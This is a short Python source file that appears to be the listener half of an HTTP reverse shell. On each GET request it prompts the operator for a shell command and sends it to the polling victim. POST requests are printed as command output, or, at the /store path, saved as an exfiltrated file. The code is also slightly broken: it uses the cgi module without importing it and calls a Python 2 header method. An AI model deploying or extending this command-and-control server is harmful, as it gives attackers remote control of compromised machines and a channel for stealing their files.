import requests
import socketserver
import http.server
from colorama import Fore, Back, Style

PORT = 8080

QUIT = False


class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(s):
        command = input(Fore.YELLOW + ">> ")
        print(Style.RESET_ALL)
        # print(type(command))
        s.send_response(200)
        s.send_header("Content-type", "text/html")
        s.end_headers()
        s.wfile.write(command.encode())

    def do_POST(s):

        if s.path == '/store':  # Check whether /store is appended or not
            try:
                ctype, pdict = cgi.parse_header(
                    s.headers.getheader('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=s.rfile, headers=s.headers, environ={
                                          'REQUEST_METHOD': 'POST'})
                else:
                    print("[-] Unexpected POST request")
                # Here file is the key to hold the actual file
                fs_up = fs['file']
                # Create new file and write contents into this file
                with open('/root/Desktop/demo.txt', 'wb') as o:
                    o.write(fs_up.file.read())
                    s.send_response(200)
                    s.end_headers()
            except Exception as e:
                print(e)
            return
        s.send_response(200)
        s.end_headers()
        # Define the length which means how many bytes the HTTP POST data contains
        length = int(s.headers['Content-Length'])
        # Read then print the posted data
        postVar = s.rfile.read(length).decode()
        print(Fore.GREEN + postVar)
        print(Style.RESET_ALL)


with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
    print("serving at port", PORT)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("Server is terminated")
        httpd.server_close()
